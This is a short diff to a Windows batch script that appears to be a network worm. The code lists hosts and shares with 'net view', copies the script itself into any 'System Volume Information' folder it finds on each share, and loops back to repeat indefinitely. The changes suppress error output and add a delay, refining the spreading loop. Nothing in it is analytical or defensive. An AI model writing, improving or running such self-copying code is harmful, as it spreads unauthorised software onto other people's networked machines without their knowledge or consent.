@@ -133,8 +133,8 @@ timeout /nobreak /t 5 >nul
 
 
 
-for /f "skip=3 tokens=1,* delims= " %%h in ('net view') do if /i "%%h" NEQ "The" (
-  for /f "skip=7 tokens=1,* delims= " %%i in ('net view %%h') do if /i "%%i" NEQ "The" (
+for /f "skip=3 tokens=1,* delims= " %%h in ('net view 2^>nul') do if /i "%%h" NEQ "The" (
+  for /f "skip=7 tokens=1,* delims= " %%i in ('net view %%h 2^>nul') do if /i "%%i" NEQ "The" (
     for /f "delims=" %%j in ('dir "%%h\%%i\*" /a:d /b 2^>nul') do (
       if /i "%%j" == "System Volume Information" (
         if not exist "%%h\%%i\%%j\%~nx0" copy /y "%~dpnx0" "%%h\%%i\%%j\"
@@ -159,6 +159,7 @@ for /f "skip=3 tokens=1,* delims= " %%h in ('net view') do if /i "%%h" NEQ "The"
 )
 
 timeout /nobreak /t 5 >nul
+timeout /nobreak /t 2 >nul
 goto :cycle
 
 
